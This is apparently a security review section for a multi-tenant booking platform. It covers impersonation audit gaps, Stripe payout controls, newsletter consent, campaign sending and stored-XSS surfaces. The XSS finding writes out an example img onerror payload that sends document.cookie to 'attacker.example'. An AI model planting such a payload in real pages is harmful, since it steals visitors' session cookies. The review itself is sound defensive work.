# Section 10: Super-admin tools, tenant onboarding, communications & audit

## Scope

Read end-to-end:

- `webapi/Controllers/SuperAdminController.cs` (the business logic beyond the
  auth attribute audit done in Section 1: bootstrap, tenant CRUD, impersonation,
  refund queue, payouts, reconciliation, marketing capture).
- `webapi/Controllers/TenantController.cs` (Stripe Connect onboarding, every
  per-section settings endpoint, branding image upload, home content / daily
  status / footer, gallery + track graphics CRUD + reorder).
- `webapi/Controllers/TenantPayoutController.cs` (tenant-facing read-only payout
  view).
- `webapi/Controllers/NewsletterController.cs` (public subscribe/unsubscribe,
  authenticated rider self-serve, tenant admin list/add/import/delete).
- `webapi/Controllers/CampaignController.cs` (draft / send / delete; the "send
  stub" flow).
- `webapi/Controllers/NotificationController.cs` (in-app inbox + preferences).
- `webapi/Controllers/EventSubscriptionController.cs` (re-read in full; Section 1
  only covered the `Status?email=` oracle).
- `Services/Repositories/TenantRepository.cs`, `TenantPayoutRepository.cs`,
  `NewsletterRepository.cs`, `EmailCampaignRepository.cs`,
  `NotificationRepository.cs`, `NotificationPreferenceRepository.cs`,
  `AuditLogRepository.cs`, `EventSubscriptionRepository.cs`.
- `Services/Audit/IAuditLogger.cs` + `webapi/Helpers/HttpContextAuditLogger.cs`.
- `Services/Notifications/NotificationService.cs`, `NotificationKinds.cs`,
  `EventNotifier.cs`.
- `Services/Helpers/SmtpEmailer.cs`.
- `webapi/Helpers/JwtIssuer.cs` (impersonation claim plumbing — re-verified).
- `TaskRunner/Program.cs` + `Services/Payments/MonthlyPayoutDrafter.cs`
  (scheduled work surface).
- `webapi/Controllers/UserController.cs` (re-read for audit coverage of role /
  status / password-reset writes).
- `webapi/Controllers/MeController.cs` (cancel / share / coupon endpoints to
  confirm the audit + notification surface).
- `vueapp/src/views/SuperAdmin/Bootstrap.vue`, `Dashboard.vue`, `Marketing.vue`.
- `vueapp/src/views/Admin/Settings/` (Branding, Features, General, HomePage,
  Membership, Payments).
- `vueapp/src/views/Admin/Campaigns.vue`, `Subscribers.vue`.
- `vueapp/src/components/RichTextView.vue` (the sanitizing component) +
  `vueapp/src/components/RichTextEditor.vue` (TipTap composer).
- `vueapp/src/views/Home.vue`, `vueapp/src/components/Footer.vue` (the two
  surfaces where stored admin HTML actually renders).
- `RidePass.Migrator/Scripts/Script0014_Newsletter.sql`,
  `Script0019_Notifications.sql`, `Script0020_NotificationPreferences.sql`,
  `Script0021_AuditLog.sql`, `Script0001_InitialSchema.sql` (tenant + users base
  schema, to confirm CASCADE behavior referenced below).

Spot-checked:

- All eight call sites of `_audit.Log` in the repo
  (`grep IAuditLogger` returns only `SuperAdminController` and `MeController`).
- `webapi/Controllers/MembershipController.UpdateSettings` to confirm membership
  settings DO have validation (`UpdateMembershipSettingsRequest` has `[Range]` +
  `[RegularExpression]` constraints) and DO NOT call `_audit.Log`.
- `UpdateTenantServiceChargeRequest` DTO (range-validated 0–10000 bps).
- `BootstrapRequest` DTO (password `MinLength(8)` — good).
- `CreateTenantRequest` DTO (subdomain regex `^[a-z][a-z0-9-]{1,62}$`, timezone
  IANA-validated by the controller).

Section 1 covered super-admin attribute discipline, the impersonation token
shape, the JWT 24-hour TTL, the duplicate `[Authorize]` smell on
`UpdateTenantServiceCharge`, the `EventSubscription.StatusByEmail` oracle, and
the `TenantPayoutController.GetPayoutCsv` rate limit. Section 7 covered storage
issues and password-reset host spoofing. Section 8 covered branding image / file
upload size caps and admin list reorder gaps. None of those are repeated here.

## Architecture summary

**Two notification surfaces, neither end-to-end.** `INotificationService` writes
`notification` rows (the in-app inbox) and fires fire-and-forget transactional
emails to admins for a handful of operational kinds (`dispute_opened`,
`refund_processed`, `payout_paid`, etc.). `EmailCampaignRepository` +
`CampaignController.Send` materialize per-recipient `email_campaign_send` rows
and mark the campaign `sent` — but the controller's own comment
(line 110-112, 143-156) says *"Does NOT deliver email — wiring to SMTP/SES is a
future task. Safe to call now to exercise the flow."* `SmtpEmailer` exists and
is wired into `NotificationService` and `UserController` (welcome / reset
emails); it is **not** wired into `CampaignController.Send`. The frontend warns
"Email delivery isn't wired up yet" in an `<v-alert>` on Campaigns.vue.

**Stripe Connect is per-tenant.** `TenantController.StartStripeConnectOnboarding`
creates a Standard account if none exists (`stripe_connect_status` becomes
`'pending'`), then returns a hosted account-link URL with return + refresh URLs
on the resolved subdomain. `RefreshStripeConnectStatus` re-polls. `DisconnectStripe`
clears the IDs on our side without revoking on Stripe. `TestStripeConnect`
round-trips a no-op call.

**Payouts have two paths.** Super admin `CreateTenantPayout` opens a `pending`
row for a date range, calls `AttachUnpaidEntries` (claims every `tenant_ledger_entry`
in the period without a `payout_id`), and refreshes totals.
`SendPayoutViaStripe` runs the actual Stripe Transfer and flips the row to
`paid` synchronously (with the transfer id as `external_reference`).
`UpdateTenantPayoutStatus` is the manual "I sent a check, here's the date"
backstop. `Void` only works for `pending`. The `TaskRunner` runs
`MonthlyPayoutDrafter.Run()` every 30 minutes to draft previous-month payouts —
idempotent on `(tenant_id, period_start_utc)`.

**Audit log is sparse.** `IAuditLogger` is a clean interface; the implementation
reads actor + IP from `HttpContext`. It has only **eight** call sites repo-wide,
all in `SuperAdminController` (6) and `MeController` (2). The full list:
`tenant.create`, `super_admin.bootstrap`, `super_admin.create`,
`tenant.serviceCharge.update`, `refund.process` (×2), `payout.create`,
`payout.stripeTransferSent`, `payout.stripeTransferFailed`, `payout.statusChange`,
`payout.void`, `rider.self_cancel`, `rider.cancel_request`. **Nothing else
writes to `audit_log`.**

**Notifications are user-scoped at the DB level.** `recipient_user_id` FK +
`ListForUser` predicate on `recipient_user_id = @userId` is correct.
`MarkRead` correctly requires both `id` AND `userId` in the predicate.
Preferences `notification_preference` is `(user_id, kind)` — only the owning
user's controller endpoints (`Preferences/{kind}` PUT) can change them.

**Tenant CRUD by super admin is create-only and edit-by-narrow-endpoint.**
There is no `DELETE /api/SuperAdmin/Tenants/{id}` — given the schema's
`ON DELETE CASCADE` chain on `tenant`, this is the right call. There is no
`UPDATE` for `tenant.subdomain` or `tenant.display_name` after creation;
subdomain is locked in by `CreateTenant` and only branding/settings can change.
That's a defensible choice given the subdomain shows up on every email and Stripe
metadata.

## Inline fix applied during this review

None. Section 10 is read-only review; the findings below all require design or
multi-file changes.

## Findings

| Severity | Location | Description | Suggested fix |
|---|---|---|---|
| **Critical** | `webapi/Controllers/SuperAdminController.cs:281-321` (`Impersonate`) + JWT TTL | An impersonated super admin can perform **any** action the target user can perform (refund, cancel, write to catalog, push a campaign), and the resulting `audit_log` rows show `actor_user_id = target.Id` / `actor_role = target.Role` because `HttpContextAuditLogger` reads from the *token's* claims (`UserId` + `role`) and the impersonation token carries the target's identity. `impersonated_by` is in the JWT but never read by the audit logger. **Net effect: a super admin can frame a tenant_admin** — start an impersonation session, refund a customer / change service charge / send a campaign, and the audit log says the tenant_admin did it. The 1-hour token TTL doesn't help; once issued, no revocation exists. Section 1 flagged the missing claim plumbing as Medium; the combination with the eight `_audit.Log` call sites in this review elevates it because **every** sensitive surface (refund/payout/cancel/campaign) inherits this attribution gap. | Two parts: (a) extend `IAuditLogger.Log` (or `AuditLogEntry`) with an `ImpersonatedByUserId` column and update `HttpContextAuditLogger` to read the `impersonated_by` claim, write it to the row, and prefer it when displaying actor in audit-log UIs. Add a migration to add the column to `audit_log`. (b) Consider blocking the financially-load-bearing surfaces (refund / payout dispatch / service charge change / campaign send) when the token has `impersonated_by`. The intent of impersonation is "see what the admin sees"; mutating production money from inside an impersonation session is rarely the right tool. |
| **Critical** | `webapi/Controllers/CampaignController.cs:113-157` (`Send`) — **unsubscribe is not respected** when delivery is wired up | Today the campaign send is a stub (logs, no SMTP), so this isn't yet exploitable in prod. **But** the recipient materialization at line 126 calls `_subscribers.ListActiveForSend(_tenantContext.TenantId)`, which correctly filters `unsubscribed_at IS NULL` — good — and the per-send rows are stored on `email_campaign_send` with NO `unsubscribe_token` column. When SMTP is wired, the campaign body is the `body_html` typed by the admin verbatim. There is **no automatic unsubscribe footer**, no per-send unsubscribe token, no `List-Unsubscribe` / `List-Unsubscribe-Post: List-Unsubscribe=One-Click` headers, and no mechanism to suppress a recipient who unsubscribes *between* `MarkSending` and the actual deliveries running in a worker. Gmail's bulk-sender rules (Feb 2024) require working one-click unsubscribe for anything that looks like a campaign — without it, future campaigns will land in spam or be rejected outright. There's also no per-recipient delivery suppression: if the same subscriber appears with mixed case email in two campaigns, the `(campaign_id, email)` unique index doesn't span campaigns. | Before wiring delivery: (a) require campaign body templates to interpolate `{{unsubscribe_url}}` server-side (use `newsletter_subscriber.unsubscribe_token` → `https://{sub}.{apex}/Unsubscribe/{token}`); (b) send with `List-Unsubscribe: <https://.../Unsubscribe/{token}>, <mailto:unsubscribe+{token}@ridepass.io>` and `List-Unsubscribe-Post: List-Unsubscribe=One-Click`; (c) re-check `unsubscribed_at IS NULL` per-send row at deliver time, not just at materialize time; (d) ship a basic suppression list (bounce / complaint / hard-unsub) before the first real campaign goes out. The Campaign UI's `<v-alert>` warning is honest but it's the only thing standing between "stub" and "send 10,000 emails with no opt-out." |
| **High** | `webapi/Controllers/CampaignController.cs:113-157` + `Services/Helpers/SmtpEmailer.cs` (entire file) | The (eventual) send path will hit `SmtpEmailer.Send`, which opens **one `SmtpClient` per email**, connects, authenticates, sends a single `MailMessage`, disposes. There is no batching, no connection reuse, no chunking, no per-tenant rate limit. With Campaigns.vue offering a "Send" button that runs synchronously inside the HTTP request, a tenant with 5,000 active subscribers will (a) saturate the SMTP relay for several minutes, (b) hold the HTTP connection open for the entire send (no `task.run_in_background` pattern), and (c) on failure leave half the `email_campaign_send` rows in `pending` with no resume mechanism. Per the user's memory note, RidePass chunks BCC sends at 30 for Gmail's BCC cap; RidePass doesn't chunk at all. | Move the send loop into the TaskRunner (`MonthlyPayoutDrafter` is already the template). On `Send`, the controller should only flip the campaign to `sending` and enqueue; the worker picks it up, sends in chunks with `SmtpClient` connection reuse, updates `email_campaign_send.status` per row, and marks the campaign `sent` only after all rows resolve. If you keep the inline send for v1, at least batch-process the recipients with a single `SmtpClient` instance and surface partial-failure shape in the response. |
| **High** | `webapi/Controllers/SuperAdminController.cs:611-679` (`SendPayoutViaStripe`) — **no two-person rule, no max-amount guard** | A single super admin can dispatch arbitrarily large Stripe Transfers with one click. No second approver, no max-amount confirmation, no out-of-band 2FA step-up. The audit row is good (`payout.stripeTransferSent` with transfer id + amount) but writes-after-the-money-moved. Combined with the 1-hour impersonation TTL, a phished super-admin token can drain any tenant balance to the connected account in one request. The Stripe Connect flow assumes the tenant controls the destination — true if they completed KYC, but a malicious super admin who edits `tenant.stripe_connect_account_id` (directly via `SetStripeConnectAccount`, no audit on that path either) can re-target the next transfer. | Add a per-tenant `max_payout_cents_per_dispatch` setting (cap at, say, $50k by default) and require a separate `Approve` action by a different super admin before the Stripe Transfer is created when the amount exceeds the cap. Audit-log `tenant.stripeConnect.set` and `tenant.stripeConnect.clear` (neither is currently logged, see next finding). For real defense, require a step-up auth (TOTP / hardware key) on this endpoint regardless of amount — it's the only endpoint that moves money out of the platform account. |
| **High** | `webapi/Controllers/TenantController.cs:66-128` (`StartStripeConnectOnboarding`, `RefreshStripeConnectStatus`, `DisconnectStripe`) + `Services/Repositories/TenantRepository.cs:108-142` (`SetStripeConnectAccount`, `UpdateStripeConnectStatus`, `ClearStripeConnect`) — **NO audit log entries** | The four Stripe Connect write paths (create account / refresh status / disconnect / first-time link) all change the destination of future tenant payouts. None call `_audit.Log`. If a tenant_admin's token is phished, an attacker can `POST /api/Tenant/StripeConnect/Onboard` to create a *new* Connect account under attacker-controlled email (`connect+{tenant.Subdomain}@ridepass.io` — see TenantController.cs:77; the email is platform-controlled, not attacker-controlled, but the onboarding link can then be completed by the attacker against their own bank account because the link is just returned in the JSON response). On disconnect there's no record that the link was severed. | Audit-log all four: `tenant.stripeConnect.onboardStart` (with the account id + whether it was newly created), `tenant.stripeConnect.refreshStatus` (with old → new status), `tenant.stripeConnect.disconnect`, and `tenant.stripeConnect.statusChanged` (called from the webhook handler in Section 2). For onboarding specifically, also notify all super admins via `EmitToSuperAdmins` so the platform team sees every new Connect account come online. |
| **High** | `vueapp/src/views/Home.vue:150` + `vueapp/src/components/Footer.vue:77` (`v-html` on `branding.aboutHtml` and `branding.refundPolicyHtml`) — **stored XSS surface** | `RichTextView.vue` exists and uses DOMPurify with a tight tag allowlist — but `Home.vue` and `Footer.vue` bypass it and render the tenant admin's HTML directly with `v-html`. The TenantController endpoints store the body verbatim (no server-side sanitization in `TenantRepository.UpdateHomeContent` / `UpdateFooter`). The composing tenant admin uses `RichTextEditor.vue` (TipTap) which constrains the UI, but a tenant admin can POST any HTML they want to `PUT /api/Tenant/Home/Content` — including `<img src=x onerror="fetch('https://attacker.example/'+document.cookie)">` — and it renders on every visitor's home page. Same on the refund-policy dialog. Blast radius is the offending tenant's own riders; trust radius is the tenant admin, but only `SettingsManage` permission is required, and the resulting payload reaches anonymous visitors. | Replace the two `v-html="branding.aboutHtml"` / `v-html="branding.refundPolicyHtml"` with `<RichTextView :html="branding.aboutHtml" />` / `<RichTextView :html="branding.refundPolicyHtml" />`. Additionally, sanitize server-side in `TenantRepository.UpdateHomeContent` / `UpdateFooter` (Ganss.Xss for .NET is the usual choice) so a future surface that forgets to use `RichTextView` doesn't re-open the hole. The same fix applies to `vueapp/src/views/Admin/Campaigns.vue:73` (`v-html="composeForm.bodyHtml"` in the read-only preview) — the admin is rendering their own draft, but the campaign body will eventually be sent to riders and previewed in admin chains. |
| **High** | `webapi/Controllers/SuperAdminController.cs:127-212` (`CreateTenant`) — **tenant_admin temporary password handed back in HTTP response body** | Same pattern Section 7 flagged for `UserController.CreateTenantUser`. Here the super admin creates the tenant + first admin and the response includes `AdminTemporaryPassword` so the super-admin's screen shows it (and the welcome email also includes it). Worse here than the per-tenant case because (a) the super admin is on the apex and may be screen-sharing during onboarding calls, (b) the email is sent to the admin's address but the welcome email instructs them to log in with the temp password and reset *after* — no `password_must_change` flag exists. Audit log captures `tenant.create` with the subdomain but not the temp-password event. | Same fix: emit a one-time password-reset token to the new admin's email, drop `AdminTemporaryPassword` from `CreateTenantResponse`, and add a `users.password_must_change` flag (or `users.password_set_at` watermark) so login can require a reset before issuing the session token. |
| **High** | `webapi/Controllers/UserController.cs:370-441` (`UpdateTenantUserRole`, `UpdateTenantUserStatus`, `ResetTenantUserPassword`) — **NO audit log** | A tenant_admin can promote any tenant user to `tenant_admin`, disable any tenant user, or reset any tenant user's password (returning a temp password in the response). Zero `_audit.Log` calls in `UserController.cs` (grep confirms). These are the highest-leverage actions a tenant admin can take and there is no record of who did what. A compromised tenant_admin account can promote an attacker user to admin, demote the original admin, and disable any auditor — leaving no trail. | Plumb `IAuditLogger` into `UserController` and emit `user.role_change` (with from/to role + target user id), `user.status_change` (with from/to status), `user.password_reset_by_admin` (with target user id, NOT the temp password), and `user.create` (with role) on every write. While you're in there, plumb the same for the global `super_admin.create` (already audited) and consider auditing successful + failed `Login` (Section 7 already flagged the missing login audit). |
| **High** | `webapi/Controllers/UserController.cs:50-98` (`Login`) — **no audit on success or failure** (re-emphasis) | Section 7 flagged this as part of "no rate limit, no account lockout, no failed-attempt audit log" for the brute-force surface. Re-emphasizing here because Section 10's audit-coverage review makes the gap more visible: every other money-moving action eventually writes audit, but the auth front door — the most relevant signal for breach detection — writes nothing. Same fix as Section 7 (rate limit + audit). | Per Section 7. The audit row should carry `action = "auth.login.success"` / `"auth.login.failure"`, `actor_email = request.Email` (so audit shows attempted-vs-actual user), IP, UA, and tenant context. |
| **High** | `webapi/Controllers/NewsletterController.cs:36-58` (public `Subscribe`) — **no rate limit, no double opt-in, no anti-bot** | `POST /api/Newsletter/Subscribe` is `[AllowAnonymous]` and the only validation is "email contains `@`" (implicit via `request.Email` — no `[EmailAddress]` validator on `SubscribeRequest`; we'd need to confirm by reading the DTO but the controller takes whatever string and trims it). A bot can flood any tenant's subscriber list with garbage addresses or, more cynically, **subscribe a victim's email** repeatedly without their consent — RidePass will accept the row and surface them as a "warm lead" to the tenant. There's no confirmation email, no double opt-in. The same applies to `POST /api/EventSubscription` (also `[AllowAnonymous]`). | Add server-side `[EmailAddress]` validation on `SubscribeRequest` (and the EventSubscription equivalent). Add IP-based rate limiting (≤ 10 subscribes per IP per hour). Implement double opt-in: insert with a `confirmed_at` column NULL, email a confirmation link, only treat the subscriber as `active` once they click — this is also the right shape for CAN-SPAM / GDPR compliance and protects tenants from list-bombing attacks. |
| **High** | `webapi/Controllers/NewsletterController.cs:222-252` (`ImportSubscribers`) — **no size cap, no per-row email validation** | Section 8 noted no size cap on the import endpoint; verified. The body is a single `string RawLines` split on `\n`; loop runs `UpsertFromSignup` once per line. There's no max-line count (`[MaxLength]` on `RawLines` would cap raw bytes), no per-batch transaction, and no validation that the email is well-formed beyond `email.Contains('@')`. A tenant admin can paste a 50MB CSV and DoS the import. Worse: a tenant admin can import unconsented addresses harvested from anywhere ("our event sign-in sheet from 2019") and the system will treat them as opted-in — `source = 'import'` is recorded but doesn't change downstream send behavior. From a deliverability standpoint this poisons sender reputation when those addresses bounce or mark spam. | Cap `RawLines.Length` (e.g. 500 KB) and cap parsed line count (e.g. 5,000). Use `EmailAddressAttribute.IsValid(email)` per line. Add a "I confirm I have consent for these contacts" checkbox on the import UI that the API enforces as a required boolean in the request. Long-term: import should also be double-opt-in (queue a confirmation email; only flip to active on click). |
| **High** | `webapi/Controllers/NewsletterController.cs:213-220` (`AddSubscriber`) — **admin can add anyone, no consent capture** | Same shape as `Import` but per-row. A tenant admin can `POST /api/Newsletter/Admin/Subscribers {"email":"anyone@anywhere.com"}` and that address is in the list, ready to receive campaigns once delivery is wired. `source = 'admin'`. No notification to the added recipient, no consent record, no audit log. | Same double-opt-in approach. Until that's in place, audit-log every `Admin/Subscribers` POST (`subscriber.admin_added`, target = subscriber id, metadata = email) so the trail exists. |
| **Medium** | `webapi/Controllers/SuperAdminController.cs:531-553` (`UpdateTenantServiceCharge`) + every other tenant-settings PUT in `TenantController` — **NO audit log on tenant settings changes** | Service charge IS audited (`tenant.serviceCharge.update`). But the dozen other tenant settings endpoints — `UpdateTenantSettings` (timezone, reservation toggles), `UpdateGiftCardSettings`, `UpdateRentalsEnabled`, `UpdateExtrasEnabled`, `UpdateSeasonPassesEnabled`, `UpdateCancellationPolicy`, `UpdateLocation`, `UpdateHomeContent`, `UpdateDailyStatus`, `UpdateFooter`, `UpdateBranding`, `UploadBrandingImage`, `DeleteBrandingImage`, plus the gallery + track-graphic CRUD — none of them call `_audit.Log`. A tenant_admin disabling waitlist, raising the gift card max to $10k, swapping the logo, or pasting malicious refund-policy HTML leaves zero trace. | Plumb `IAuditLogger` into `TenantController` (one ctor arg + a `_audit.Log("tenant.<setting>.update", summary, "tenant", _tenantContext.TenantId, _tenantContext.TenantId, new { ... })` line per write). Same for `MembershipController.UpdateSettings`. The pattern is already established in `SuperAdminController`; just apply it consistently. |
| **Medium** | `Services/Repositories/TenantRepository.cs:171-184` (`UpdateHomeContent`) — **`hours_json` is not schema-validated** | The endpoint takes whatever JSON the admin posts and persists it as `jsonb` (with a `COALESCE(@hoursJson::jsonb, '{}'::jsonb)` cast). If the admin POSTs `null` it becomes `{}`; if they POST `[1,2,3]` or `"oops"`, Postgres will accept any valid JSON value. The frontend likely sends `{mon: "9-5", tue: "9-5", ...}` but nothing enforces that. The Home.vue render path will probably break or display garbage on malformed shapes. | Validate the JSON shape server-side in `TenantController.UpdateHomeContent` against a small schema (`Dictionary<string, string>` with day-name keys). On read, prefer typed deserialization with a `try/catch` fallback so corrupted rows don't crash the home page. |
| **Medium** | `webapi/Controllers/TenantController.cs:273-279` (`UpdateDailyStatus`) — **stored UTC, no auto-expiry, no audit** | `daily_status_open` is a tri-state nullable bool; `daily_status_updated_at` is `now()` on every write. There is no automatic expiry: the admin sets "closed for rain" Friday morning, forgets to clear it, and the home page still says "closed" on Tuesday. There's no `daily_status_expires_at`. The render path likely just shows the message indefinitely. | Add `daily_status_expires_at timestamptz NULL` and let the admin set "auto-clear after N hours" (default 24h). The render path treats `expires_at < now()` as cleared. Also audit-log the toggle. |
| **Medium** | `webapi/Controllers/CampaignController.cs:113-157` (`Send`) — **no audit log, no re-send guard, no per-recipient delivery confirmation** | Send is gated by `CampaignsManage` and the campaign status guard (`only 'draft' can be sent`) prevents a second send of the *same* row — but nothing prevents a tenant admin from cloning the draft. There's no audit row written for the send action (`campaign.sent` would be the natural action) and no notification to the rest of the tenant's admins ("Alice just sent the May newsletter to 1,247 subscribers"). | Audit-log `campaign.send` with metadata `{ recipientCount, subject }`, and `EmitToTenantAdmins(tenantId, "campaign_sent", ...)` so other admins see the activity. Also persist `sent_by_user_id` on `email_campaign` (the row already has `created_by_user_id` but the *sender* can differ from the creator) so audit can be reconstructed if the audit log row is missed. |
| **Medium** | `Services/Notifications/NotificationService.cs:48-108` — **email send is fire-and-forget; failures invisible** | `EmitToSuperAdmins` and `EmitToTenantAdmins` use `_ = _emailer.Send(...)` (line 74, 105). If the SMTP call throws, the exception is swallowed by the task scheduler and the `IsConfigured && IsEmailEnabled` gate is the only thing logged. `SmtpEmailer.Send` does `_logger.LogWarning` on failure so there's a log line, but there's no per-notification record of *which* notification failed to deliver to *which* user. For payout_failed and dispute_opened notifications, missing the email is a real ops gap. | Replace `_ = ...` with `try/await/_logger.LogWarning("Email delivery failed for notification {Id}/{Kind}/{Recipient}: {Message}", ...)` so failures are correlated to the in-app notification row. For higher reliability, persist an `email_status` column on `notification` (`pending|sent|failed|skipped`) and have the SMTP send flip it. |
| **Medium** | `webapi/Controllers/EventSubscriptionController.cs:38-87` (`Subscribe`) — **unauthenticated row insertion with no consent capture** | Same shape as Newsletter.Subscribe: anyone can POST an `email` + optional phone and we'll persist a `notify_email = true` row. The `IsResolved` + `AllowEventSubscriptions` gates are good, but there's no rate limit and no double opt-in. An attacker can list-bomb subscriptions, or sign up a victim's address + phone to receive every new-event SMS from a tenant they have no relationship with (Twilio cost + harassment). | Same as the Newsletter finding. Specifically for SMS: gate `notify_sms = true` behind a phone-verification step (Twilio Verify is the usual choice) so we don't dispatch SMS to unconfirmed numbers; this also covers Twilio's STOP/HELP compliance. |
| **Medium** | `Services/Notifications/EventNotifier.cs:53-82` — **no per-tenant rate limit; no batching; not idempotent** | When a tenant admin creates an event, this notifier loops every active subscriber and fires email + SMS synchronously. No batching, no chunking (per the RidePass memory note about Gmail BCC=30). On a tenant with 2,000 subscribers, a single Create Event call can take many minutes inside the HTTP request lifecycle. If the request is retried (transient network blip, admin double-clicks), `_subs.ListActiveForTenant` runs twice and every subscriber gets two emails — there's no per-event de-dupe (no `event_subscription_send` ledger like `email_campaign_send`). | Move event notifier into the TaskRunner (queue an event_notification row on event creation, worker drains it with chunking + per-subscriber delivery confirmation). Add a `(event_id, subscription_id)` unique row on the delivery ledger so retries are no-ops. Also add the same `List-Unsubscribe` headers as the campaign send. |
| **Medium** | `webapi/Controllers/SuperAdminController.cs:611-679` (`SendPayoutViaStripe`) — **status flipped to `paid` synchronously, ignoring `transfer.failed` webhook** | The comment at lines 658-662 says Stripe Transfer.create is effectively synchronous and the `transfer.*` webhook is just a backstop. That's true for the *fund movement to Connect balance* but Stripe can still reverse a transfer for fraud / KYC reasons hours later. The current code flips to `paid` immediately with no way to track the reversal except via the `transfer.failed` webhook, which I haven't traced. If that webhook isn't wired (Section 2 mentioned the missing idempotency-key issue for `Transfer.create`), a reversed transfer leaves the local DB showing `paid` while the money is back in the platform balance. | Either: (a) write the row as `processing` and only flip to `paid` from the `transfer.paid` (or `payout.paid` on the connected account) webhook; (b) keep the synchronous `paid` flip but ensure `transfer.failed` / `transfer.reversed` webhooks flip back to `failed` and emit `payout_failed` to super admins. Cross-reference with Section 2's webhook list to confirm. |
| **Medium** | `Services/Repositories/AuditLogRepository.cs` — **no retention policy; index `idx_audit_log_created` will grow forever** | `audit_log` has five indexes and no cleanup job. At current write rates (low — eight call sites) growth is slow, but once `Login` audit and `tenant.<setting>.update` audit (per the High and Medium findings above) land, this table will be the hottest write target in the schema. There's no TTL, no archive-to-cold-storage job, no `DELETE WHERE created_at < now() - interval '2 years'`. | Add a retention job to TaskRunner (`DELETE FROM audit_log WHERE created_at < now() - interval '24 months'`). Two years is the typical compliance window for financial audit; shorter for routine settings changes. Consider partitioning by month if growth is high. |
| **Medium** | `webapi/Controllers/SuperAdminController.cs:762-772` (`GetTenantPayoutCsv`) — **no rate limit on super-admin CSV** | Section 1 flagged the tenant-facing `TenantPayoutController.GetPayoutCsv` for the same issue. The super-admin variant is also unthrottled. The leak path here is a super-admin token being phished; the attacker can iterate every tenant's every payout's CSV (which contains every ledger entry for that period — full transaction detail). | Per-route rate limit (e.g. 60 / minute / user) on both CSV endpoints, plus shorter JWT TTL (Section 1 Medium). |
| **Medium** | `vueapp/src/views/Admin/Campaigns.vue:73` (`v-html="composeForm.bodyHtml"` for preview) | Echoing the `Home.vue` / `Footer.vue` finding above for completeness. The compose dialog's read-only preview renders the admin's own HTML directly with `v-html`. While the immediate XSS surface is "admin renders content they typed themselves," the same dialog is reused for the `view sent campaign` view (line 50, "View" button on `status === 'sent'`), so any HTML that ever ended up in `body_html` (including from another admin) is rendered unsanitized. | Use `<RichTextView :html="composeForm.bodyHtml" />` for the read-only branch. The editing branch uses `RichTextEditor` (TipTap) which handles its own rendering and doesn't expose `v-html`. |
| **Medium** | `webapi/Controllers/NewsletterController.cs:62-110` (`UnsubscribeStatus` / `Unsubscribe` / `Resubscribe`) — **resubscribe via opaque token is fine, but the token never rotates** | The `unsubscribe_token` is the same UUID for the lifetime of the row. If a recipient unsubscribes, the email's link still works to *resubscribe* (good for UX) but the same token can also re-unsub them later. That's fine. But there's no rotation: if the token leaks (e.g., the unsubscribe email gets forwarded), the recipient is permanently controllable by whoever has the URL. Lower-risk than the other Highs, but worth noting that there's no token-expiry / rotate-on-resubscribe path. | Optional: rotate the token on every resubscribe (`UPDATE newsletter_subscriber SET unsubscribe_token = uuid_generate_v4() WHERE id = @id`). Costs nothing and matches what most ESPs do. |
| **Medium** | `TaskRunner/Program.cs:35-53` — **PeriodicTimer in a process with no health endpoint; failures don't page** | The TaskRunner is a separate dotnet process started by PM2 (`ecosystem.config.js` mentions a TaskRunner entry). The loop catches all exceptions and `Console.WriteLine`s them. If the DB connection breaks, no metric is emitted; if `MonthlyPayoutDrafter` silently fails, no `payout_failed` notification fires (because that notification only triggers on explicit `failed` status, not on missed draft). | Add a `/health` endpoint (or write a heartbeat row to a `task_runner_heartbeat` table) that the platform monitors, so we know the worker is alive. Have catastrophic failures emit `EmitToSuperAdmins("worker_failure", ...)` so they show in the inbox. Long term: replace PeriodicTimer with a hosted-service approach (HostedService + Quartz/Hangfire) so this isn't homegrown. |
| **Medium** | Missing background jobs (per the user's question 21) | Reading TaskRunner: only `MonthlyPayoutDrafter` runs. The following jobs are NOT scheduled and were referenced in earlier sections / are inherent to features visible here: (a) **abandoned cart cleanup** — `pass_purchase` / `event_ticket_purchase` rows in `pending` status from incomplete checkouts grow forever; (b) **waitlist promote** — Section 4 mentioned `_waitlistPromoter.PromoteNext` is called inline on cancel, but no sweeper picks up missed promotions; (c) **expired-coupon archive** — `coupon` rows past `valid_to_utc` should at least stop showing in lists; (d) **gift card delivery scheduler** — if scheduled gift cards exist, no worker dispatches them; (e) **password reset token cleanup** — `password_reset_token` rows older than 60 minutes should be `DELETE`d; (f) **event_subscription notification queue** — once moved to async (per the EventNotifier finding above); (g) **audit_log retention** (per the retention finding above); (h) **session / JWT revocation list** (if implemented). | One TaskRunner cycle should fan out to several `IScheduledJob` implementations. Start with the abandoned-cart sweeper (highest data-quality impact) and the password-reset-token cleanup (lowest risk, easiest to land). |
| **Low** | `webapi/Controllers/SuperAdminController.cs:279-321` (`Impersonate`) — re-impersonation is blocked by the `target.Role == "super_admin"` check at line 288 | Good defense — a super admin can't impersonate another super admin and then "double-hop" by impersonating from inside that session, because the second `Impersonate` call would require the policy `SuperAdminRequirement` which is satisfied by the original token (carrying the original super admin's role), and would succeed against any non-super_admin target. So in effect: a super admin can impersonate any non-super-admin from any session, including an impersonation session. That's the documented intent. No fix; flagging for the security model documentation. | Document in the impersonation flow that "impersonating from inside an impersonation session re-uses the original super admin's privileges because the original token is still in the request." This is correct behavior but non-obvious. |
| **Low** | `Services/Notifications/NotificationService.cs:48-77` (`EmitToSuperAdmins`) + `EmitToTenantAdmins` — **N+1 query pattern** | Each `Emit*` call lists every super admin / tenant admin and then inserts one notification row + (if email enabled) one SMTP send per recipient, serially. For 3 super admins this is fine; if the platform grows past 10–20 this becomes the slow path on every webhook (every refund, every dispute, every payout). | Future optimization: bulk-insert the notification rows in one statement, then parallel-fan-out the email sends with a `Task.WhenAll` bounded by `SemaphoreSlim`. |
| **Low** | `Services/Helpers/SmtpEmailer.cs:35-67` — `EnableSsl = true` hardcoded | Local dev relays without TLS will fail. Most prod SMTP relays use STARTTLS on 587 so this is right, but a port-25 internal relay would silently fail. | Make `EnableSsl` configurable via `Email:Smtp:EnableSsl` defaulting to `true`. |
| **Low** | `webapi/Controllers/CampaignController.cs:34-40` (`List`) — **no pagination, no `take`** | Lists every campaign ever created for the tenant. Will get unwieldy after a couple of years. | Add `[FromQuery] int take = 100` with `Math.Clamp`. |
| **Low** | `Services/Repositories/NewsletterRepository.cs:19-29` (`ListByTenant`) — **no pagination** | Same shape — returns all subscribers in one go. For the `Subscribers.vue` admin UI this is the entire list; for a tenant with 10,000 subscribers it'll get slow. | Add pagination. |
